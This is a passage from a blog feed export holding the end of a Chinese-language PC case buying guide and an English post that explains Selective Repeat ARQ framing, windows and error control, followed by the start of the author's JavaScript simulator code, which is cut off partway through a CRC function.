èƒ½å¡ä¸‹å¤šå¤§çš„ç¡¬ä»¶ï¼Œåœ¨è€ƒè™‘æœ¬èº«ç¾è§‚æ€§çš„åŒæ—¶ï¼Œä¹Ÿåº”è¯¥è€ƒè™‘å…¶å…¼å®¹æ€§ä»¥åŠæ•£çƒ­è¡¨ç°ç­‰å®ç”¨æ€§é—®é¢˜</p><ul><li><p>å¯¹äºITXæœºç®±ï¼Œæˆ‘æœ€æ¨èçš„æ˜¯æ›¾ä»Šè¢«å°ç¥çš„meshliciousï¼Œæ¥è‡ªSSUPDï¼Œè¿™æ˜¯ä¸€æ¬¾A4æœºç®±ï¼Œæ„æ€æ˜¯æ˜¾å¡ä¸ä¸»æ¿èƒŒé èƒŒçš„è®¾è®¡æ¨¡å¼ï¼Œè¿™æ¬¾æœºç®±çš„è‡´æ•¬äº§å“å¾ˆå¤šï¼Œä½†è¯´å®è¯è¿˜æ˜¯è¿™æ¬¾æœºç®±æœ¬èº«æœ€å€¼å¾—é’çï¼šè¶…é•¿æ˜¾å¡æ”¯æŒï¼Œæ˜¾å¡ç«–è£…ï¼Œæ”¯æŒ240å†·æ’ï¼Œåˆç†çš„èµ°ç®¡ç©ºé—´ï¼Œå…¨æ–¹ä½ç½‘æ¿é€šé£ï¼Œå¯ä»¥è¯´æ˜¯æŠŠITXçš„é™åˆ¶å»é™¤åˆ°æé™äº†ï¼Œå”®ä»·ä¹Ÿä»…ä¸ƒå…«ç™¾å…ƒå·¦å³ï¼Œéå¸¸é¦™</p><p>åœ¨A4æœºç®±ä¸­è¿˜ä¼šç»å¸¸ç”¨åˆ°PCIeå»¶é•¿çº¿ï¼Œåˆ†ä¸ºPCIe3.0å»¶é•¿çº¿å’ŒPCIe4.0å»¶é•¿çº¿ï¼Œé«˜ç«¯æ˜¾å¡éœ€è¦ä¸Š4.0çš„å»¶é•¿çº¿ï¼Œå¦åˆ™å¯èƒ½ä¼šè¢«å»¶é•¿çº¿å¡å¸¦å®½</p><p>ä½†æ³¨æ„ITXæœºç®±æ„å‘³ç€é€šå¸¸éœ€è¦ä¸ŠITXä¸»æ¿ä¸SFXå°ç”µæºï¼Œè¿™æ„å‘³ç€éœ€è¦èŠ±æ›´é«˜çš„ä»·é’±å»ä¹°è¿™äº›å°å°ºå¯¸çš„ä¸œè¥¿ï¼›åŒæ—¶ï¼ŒITXå¯¹æ˜¾å¡çš„å°ºå¯¸ä¹Ÿæœ‰è¾ƒå¤§é™åˆ¶ï¼Œæœ‰çš„åªèƒ½ä¸Šè¿·ä½ å¡ç”šè‡³ä¸èƒ½ä¸Šç‹¬æ˜¾</p></li><li><p>è‡³äºATXæœºç®±ï¼Œåªè¦é¿å¼€äº†æ˜¾å¡åŠè£…é™·é˜±ï¼Œå…¶å®å¯ä»¥éšä¾¿é€‰é¡ºçœ¼çš„</p></li></ul><p>ä½†ä¸ç®¡æ˜¯ä»€ä¹ˆæœºç®±ï¼Œéƒ½è¦æ³¨æ„ç°åœ¨æµè¡Œçš„æµ·æ™¯æˆ¿ç»ç’ƒä¾§æ¿æœ‰è¾ƒå¤§å¯èƒ½å¯¹æ•£çƒ­é€ æˆå½±å“ï¼Œå¦‚æœè¿½æ±‚æ•£çƒ­ï¼Œå°½é‡é€‰æ‹©å¸¦å¼€å­”çš„ç»ç’ƒä¾§æ¿æˆ–è€…ç›´æ¥æ¢æˆå¼€å­”çš„é“é’¢ä¾§æ¿</p><h2 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h2><ul><li>ç™½è‰²ç‰©å“é€šå¸¸æœ‰ç™½è‰²ç¨ï¼Œå³åŒæ ·å‹å·çš„ç™½è‰²æ¬¾ä»·æ ¼æ›´è´µ</li><li>æ›´è¯¦ç»†çš„ç¡¬ä»¶çŸ¥è¯†å¯ä»¥å‚è€ƒbç«™<a href="https://space.bilibili.com/14871346">@ç¡¬ä»¶èŒ¶è°ˆ</a>çš„ç³»åˆ—è§†é¢‘ï¼Œå»ºè®®è¦è‡ªå·±æ”’æœºçš„æœ‹å‹éƒ½å…ˆçœ‹ä¸€ä¸‹ï¼Œå†å»è§„åˆ’è´­ä¹°è®¡åˆ’<ul><li><a href="https://www.bilibili.com/video/BV1Ca4y1W73e">é£å†·æ°´å†·åŸç†</a></li><li><a href="https://www.bilibili.com/video/BV1UJ411B7mD">å†…å­˜åŒé€šé“åŸç†</a></li><li><a href="https://www.bilibili.com/video/BV12J411G7Tj">å†…å­˜é¢‘ç‡ç”±è°å†³å®š</a></li><li><a href="https://www.bilibili.com/video/BV1BG4y137mG">é•¿è¾¾ä¸€å°æ—¶çš„è£…æœºæ•™ç¨‹</a></li><li>â€¦â€¦</li></ul></li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Selective Repeat ARQ Simulation</title>
      <link href="2023/01/03/SelectiveRepeatARQ-Simulation/"/>
      <url>2023/01/03/SelectiveRepeatARQ-Simulation/</url>
      
        <content type="html"><![CDATA[<p>My homework in a course about computer network, coded in javascript in order to put it on my blog and give it a HTML UI to show the detailed process.</p><p>Just a simple version of selective repeat ARQ, but maybe helpful for you to understand the algorithm further.</p><p><img src="/images/ARQ_preview.png"></p><span id="more"></span><!--toc--><h1 id="Selective-Repeat-ARQ-Simulation"><a href="#Selective-Repeat-ARQ-Simulation" class="headerlink" title="Selective Repeat ARQ Simulation"></a>Selective Repeat ARQ Simulation</h1><p>First of all, you may wanna check the final result of the simulation: <a href="https://kyriota.com/html/ARQ">Portal to the final result</a></p><h2 id="Theory"><a href="#Theory" class="headerlink" title="Theory"></a>Theory</h2><p>To understand how selective repeat ARQ algorithm was implemented in my program, I recommend you understand the algorithm itself first, so that the following content can be much easier to understand.</p><blockquote><p>Iâ€™ll show this algorithm in the following example of two host communicating</p></blockquote><p><code>Host A</code> and <code>Host B</code> are connected with each other, and <code>A</code> has some data that needs to send to <code>B</code></p><h3 id="Framing"><a href="#Framing" class="headerlink" title="Framing"></a>Framing</h3><ul><li>Because the data is too long to be sent at one time (just assume so), <code>A</code> slice the data into several pieces, and give those data sequence numbers in order to tell the proper order to combine the data, in case that the datum are not received in original order</li><li>Because the message could be corrupted when transferring, the message should contain some verification code related to the message content like CRC (Cyclic Redundancy Check)</li><li>Because <code>B</code> only have information in binary, <code>B</code> needs to know where is the start of the message and so does the end. There should be flags wrapping the whole message and the flag never appear in the middle of the message</li><li>Because <code>B</code> would like to know the sender of the message in order to do some further communication, the sender information should be contained in the message</li><li>Because <code>B</code> maybe not the receiver of the message but only the router to transmit the message, the true receiver information should be contained in the message</li></ul><p>So far, the message should be something like this:</p><center><code>| flag | destination | source | sequence | data | CRC | flag |</code></center><p>After such process, the message should be called as <em>frame</em>, which is a unit of communication in data link layer.</p><blockquote><p>As for how to make flags only appear in the start and the end of a frame:</p><p>In my case, flag is 01111110 that occupies one byte of the frame. To deal with such type of flag, since there are six successive â€˜1â€™s in the flag, we can append a â€˜0â€™ every time the content of the frame appears five successive â€˜1â€™s. And in the decoding part, when five successive â€˜1â€™s was found, remove the â€˜0â€™ behind them, so makes the flag only appears in the start and the end of a frame</p></blockquote><h3 id="Window-amp-Control-Frame"><a href="#Window-amp-Control-Frame" class="headerlink" title="Window &amp; Control Frame"></a>Window &amp; Control Frame</h3><p>But the sequence number could increase to infinite if <code>A</code> keeps sending messages, so sequence number should be limited in a specific range (usually in the range of 2^n, which makes best use of all bits).</p><p>However, when sequence numbers are in a specific range, imagine such situation:</p><ul><li><p><code>A</code> send a frame with sequence <code>X</code> to <code>B</code></p></li><li><p>frame corrupted when transmitting</p></li><li><p><code>B</code> found it corrupted by doing CRC and dropped it</p></li><li><p><code>A</code> keeps sending following frames, and comes with another frame with sequence <code>X</code></p></li><li><p>Under such situation, <code>B</code> could take this frame and think it the frame that <code>B</code> found corrupted</p></li></ul><p>In order to make the algorithm work properly, control frame and window are introduced. Hereâ€™s how these things make <code>A</code> stop sending frames when frames are corrupted:</p><ul><li><p>With window and ACK (Acknowledge character) frame implemented, pretend sequence number takes 3 bits, and windows size is 3. The following text indicates sequence of sender(L) and receiver(R), contents in brackets indicates frames that are in current window:</p><ul><li><p>At the beginning:</p><center><code>&#123; |0|1|2| &#125; |3|4|5|6|7|0|1|2|3|... => &#123; |?|?|?| &#125;</code></center></li><li><p><code>A</code> sends frame 0 and starts a timer for frame 0</p></li><li><p><code>B</code> received it properly</p>  <center><code>&#123; |0|1|2| &#125; |3|4|5|6|7|0|1|2|3|... => &#123; |0|?|?| &#125;</code></center></li><li><p>Because frame 0 is in the correct order, <code>B</code> transmits frame 0 to upper layer to do further process and removes frame 0 from its buffer (in order to make the process clearer, the frame 0 is still texted in the buffer), at the same time, <code>B</code> shifts its window forward and sends ACK frame 0 to <code>A</code></p>  <center><code>&#123; |0|1|2| &#125; |3|4|5|6|7|0|1|2|3|... => |0| &#123; |?|?|?| &#125;</code></center></li><li><p><code>A</code> received ACK frame 0, so <code>A</code> removes frame 0 from its buffer, stops timer for frame 0, and shifts the window forward</p>  <center><code>|0| &#123; |1|2|3| &#125; |4|5|6|7|0|1|2|3|... => |0| &#123; |?|?|?| &#125;</code></center></li><li><p><code>A</code> sends frame 1 and starts a timer for frame 1</p></li><li><p>frame 1 corrupted when transmitting</p></li><li><p><code>B</code> received corrupted frame and drops it</p></li><li><p><code>A</code> sent frame 2, frame3, and <code>B</code> received them properly and sent ACK frame 2, 3 to <code>A</code>. But due to the first element in the window is not received, <code>B</code> could not shift the window</p>  <center><code>|0| &#123; |1|2|3| &#125; |4|5|6|7|0|1|2|3|... => |0| &#123; |?|2|3| &#125;</code></center></li><li><p>Also, because the first element in the window didnâ€™t receive an ACK frame, <code>A</code> cannot move the window neither. Because <code>A</code> finished sending mission in the window, <code>A</code> stops sending the next frame, which is frame 4, and waits for <code>B</code> to send ACK frame 1</p></li><li><p>Timer for frame 1 found frame 1 overtime, so <code>A</code> sends frame 1 again</p></li><li><p><code>B</code> received it properly</p>  <center><code>|0| &#123; |1|2|3| &#125; |4|5|6|7|0|1|2|3|... => |0| &#123; |1|2|3| &#125;</code></center></li><li><p><code>B</code> shifts the window, transmits frame 1, 2, 3 to upper layer, and sends ACK frame 1 to <code>A</code></p>  <center><code>|0| &#123; |1|2|3| &#125; |4|5|6|7|0|1|2|3|... => |0|1|2|3| &#123; |?|?|?| &#125;</code></center></li><li><p><code>A</code> removes frame 1, 2, 3 from buffer and shifts the window</p>  <center><code>|0|1|2|3| &#123; |4|5|6| &#125; |7|0|1|2|3|... => |0|1|2|3| &#123; |?|?|?| &#125;</code></center></li></ul></li><li><p>Under such implementation, there is nearly no problems for <code>A</code> and <code>B</code> can communicate with each other. But the overtime machinic seems too time consuming if ever time a frame is corrupted <code>A</code> will wait for a certain period. So we can make <code>B</code> send a NAK (Negative Acknowledgment) frame to make <code>A</code> resend faster (if <code>B</code> can recognize the sender and sequence number of the corrupted frame)</p></li></ul><p>We call ACK frames and NAK frames as control frames, and normal frames that sending data are called data frames</p><p>I think you may have a brief knowledge to selective repeat ARQ after my explanation, now I propose following principles to enhance your knowledge:</p><ul><li>Sender will not shift window until the first frames in the window receives ACK frame</li><li>Receiver will not transmit data to upper layer nor shift the window until the frames in the window are received in the right order</li><li>Control frames are dropped once confirmed</li><li>Every frame has its timer, they are started once the frame is sent or resent</li></ul><h3 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h3><ul><li><p>Notice that the control frames should be sent with the <strong>highest priority</strong>. Imaging the frame sending buffer has a lot of data frames queuing to be sent. If let the control frames queue behind them, they will never get sent due to the window limit.</p></li><li><p>In order to tell the frame type, itâ€™s better to add a segment in frame. In my program, the frame is coded as following:</p>  <center><code>|&nbsp; flag&nbsp; | type &nbsp;| destination | source | sequence |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; data&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | &nbsp;CRC &nbsp;&nbsp;| &nbsp;flag&nbsp; |</code></center>  <center><code>| 1 byte | 1 bit | &nbsp;&nbsp;2 bits &nbsp;&nbsp;&nbsp;| 2 bits | &nbsp;4 bits &nbsp;| at least 1 byte | 1 byte | 1 byte |</code></center><p>  So the minimal length of the frame is 41 bits. And in order to make timeout a short time to wait, the maximal length shouldnâ€™t be too long. In my program, I set max length to 65 bits, which means the data has max length of 4 bytes. When the data size is bigger than max length, the data is sliced into pieces.</p></li><li><p>When corruption rate of the channel is rather a big number, the max length of the frame should be shorter in order to avoid resending.</p></li></ul><h3 id="Error-Control"><a href="#Error-Control" class="headerlink" title="Error Control"></a>Error Control</h3><p>In order to deal with flipping bit that may occur in any part of the frame, discuss every possible situation is necessary for robustness of the program</p><ul><li><p><strong>How receiverâ€™s binary buffer deal with flags</strong></p><p>  If everything goes right, the binary buffer should receive: <code>01111110 ... 01111110</code>, then receiver will take it out from the buffer as a frame and delete those bits in buffer</p><p>  When the binary buffer receives following stuff: <code>... 01111110</code>, which means flag appears after some data. In such situation. The bin buffer should drop all the data before the flag and wait for following data</p><p>  When the binary buffer receives following stuff:<code>01111110 ...(only a few bits)... 01111110</code>, which means the second flag appears before the frame reaches itâ€™s minimal length. The bin buffer should drop all bits before the second flag and wait for following data</p></li><li><p><strong>Start Flag</strong></p><p>  When a bit was flipped in the start flag, receiver cannot recognize a frame anymore, the related frame drops, only waiting for timeout</p></li><li><p><strong>End Flag</strong></p><p>  When a bit was flipped in the end flag, receiver will take the start flag of the next frame as the end flag of the former one, which will break the current frame and the next frame</p><p>  However, the receiver can still get the sender address and the sequence of the first frame, so receiver will send NAK frame about the first frame to sender, but directly drop the next frame without sending NAK frame, only waiting for timeout</p></li><li><p><strong>Destination</strong></p><p>  When a bit was flipped in the destination, the receiver could not receive the frame at all, only waiting for timeout</p></li><li><p><strong>Source</strong></p><p>  When a bit was flipped in the source, the receiver will find CRC doesnâ€™t match and may send a NAK frame to a wrong host. If the wrong host happen to have connection to the receiver, itâ€™s also not a big deal since the worst situation is that the wrong host will send a frame to the receiver</p></li><li><p><strong>Sequence</strong></p><p>  When a bit was flipped in the sequence, the receiver will find CRC doesnâ€™t match and send a NAK frame about a wrong frame to the sender. Not a big deal since the worst situation is that the sender will repeat a frame and wait for the flipped frame until timeout</p></li><li><p><strong>Data</strong></p><p>  When a bit was flipped in the sequence, the receiver will find CRC doesnâ€™t match and send a NAK frame to the sender</p></li><li><p><strong>CRC</strong></p><p>  When a bit was flipped in the sequence, the receiver will find CRC doesnâ€™t match and send a NAK frame to the sender</p></li></ul><h2 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h2><p>For <code>ARQ_Simulator.js</code></p><div class='spoiler collapsed'>    <div class='spoiler-title'>        Utilities    </div>    <div class='spoiler-content'>        <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> START_TIME = <span class="built_in">Date</span>.now();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> FrameSenderStatus = &#123;</span><br><span class="line">    Queuing: <span class="number">0</span>,</span><br><span class="line">    Sending: <span class="number">1</span>,</span><br><span class="line">    WaitingAck: <span class="number">2</span>,</span><br><span class="line">    Timeout: <span class="number">3</span>,</span><br><span class="line">    Acked: <span class="number">4</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> FrameType = &#123;</span><br><span class="line">    Data: <span class="number">0</span>,</span><br><span class="line">    Control: <span class="number">1</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bin2bytes</span>(<span class="params">bin</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (bin.length % <span class="number">8</span> != <span class="number">0</span>) <span class="comment">// Padding 0 to the first byte</span></span><br><span class="line">        bin = <span class="built_in">Array</span>(<span class="number">8</span> - bin.length % <span class="number">8</span>).fill(<span class="number">0</span>).concat(bin);</span><br><span class="line">    <span class="keyword">var</span> bytes = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; bin.length; i += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> byte = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++) &#123;</span><br><span class="line">            byte = byte &lt;&lt; <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (i + j &lt; bin.length)</span><br><span class="line">                byte += bin[i + j];</span><br><span class="line">        &#125;</span><br><span class="line">        bytes.push(byte);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bytes2bin</span>(<span class="params">bytes</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> (bytes) == <span class="string">&quot;number&quot;</span>)</span><br><span class="line">        bytes = [bytes];</span><br><span class="line">    <span class="keyword">var</span> bin = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; bytes.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (bytes[i] &gt; <span class="number">255</span> || bytes[i] &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="string">&quot;Byte out of range&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)</span><br><span class="line">            bin.push((bytes[i] &gt;&gt; (<span class="number">7</span> - j % <span class="number">8</span>)) &amp; <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bin;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str2bytes</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Convert a string to an array of bytes</span></span><br><span class="line">    <span class="comment">// UTF-8 Supported</span></span><br><span class="line">    <span class="keyword">var</span> bytes = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; str.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> charCode = str.charCodeAt(i);</span><br><span class="line">        <span class="keyword">if</span> (charCode &gt; <span class="number">0xFFFF</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="string">&quot;Character out of range&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (charCode &lt; <span class="number">0x80</span>) &#123;</span><br><span class="line">            bytes.push(charCode);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (charCode &lt; <span class="number">0x800</span>) &#123;</span><br><span class="line">            bytes.push(<span class="number">0xC0</span> | (charCode &gt;&gt; <span class="number">6</span>), <span class="number">0x80</span> | (charCode &amp; <span class="number">0x3F</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            bytes.push(<span class="number">0xE0</span> | (charCode &gt;&gt; <span class="number">12</span>), <span class="number">0x80</span> | ((charCode &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x3F</span>), <span class="number">0x80</span> | (charCode &amp; <span class="number">0x3F</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bytes2str</span>(<span class="params">bytes</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Convert an array of bytes to a string</span></span><br><span class="line">    <span class="comment">// UTF-8 Supported</span></span><br><span class="line">    <span class="keyword">var</span> str = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; bytes.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (bytes[i] &lt; <span class="number">0x80</span>) &#123;</span><br><span class="line">            str += <span class="built_in">String</span>.fromCharCode(bytes[i]);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (bytes[i] &lt; <span class="number">0xE0</span>) &#123;</span><br><span class="line">            str += <span class="built_in">String</span>.fromCharCode(((bytes[i] &amp; <span class="number">0x1F</span>) &lt;&lt; <span class="number">6</span>) | (bytes[i + <span class="number">1</span>] &amp; <span class="number">0x3F</span>));</span><br><span class="line">            i++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            str += <span class="built_in">String</span>.fromCharCode(((bytes[i] &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">12</span>) | ((bytes[i + <span class="number">1</span>] &amp; <span class="number">0x3F</span>) &lt;&lt; <span class="number">6</span>) | (bytes[i + <span class="number">2</span>] &amp; <span class="number">0x3F</span>));</span><br><span class="line">            i += <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">binArray2CubeText</span>(<span class="params">bin</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> str = bin.join(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="comment">// replace 0 with â–¢ and 1 with â–©</span></span><br><span class="line">    str = str.replace(<span class="regexp">/0/g</span>, <span class="string">&quot;â–¢&quot;</span>).replace(<span class="regexp">/1/g</span>, <span class="string">&quot;â–©&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CubeText2binArray</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// replace â–¢ with 0 and â–© with 1 and make it bin array</span></span><br><span class="line">    str = str.replace(<span class="regexp">/â–¢/g</span>, <span class="string">&quot;0&quot;</span>).replace(<span class="regexp">/â–©/g</span>, <span class="string">&quot;1&quot;</span>).replace(<span class="regexp">/ /g</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> bin = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; str.length; i++) &#123;</span><br><span class="line">        bin.push(<span class="built_in">parseInt</span>(str[i]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bin;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">crc8</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// CRC-8-CCITT</span></span><br><span class="line">    <span class="comment">// data: array of bytes</span></span><br><span class="line">    <span class="keyword">var</span> POLY = <span class="number">0x07</span>,</span><br><span class="line">        INIT = <span class="number">0</span>,</span><br><span class="line">        XOROUT = <span class="number">0x55</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> crc = INIT, i = <span class="number">0</span>; i &lt; data.length; i++) &#123;</span><br><span class="line">        crc = crc ^ data[i];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++) &#123;</span><br><span 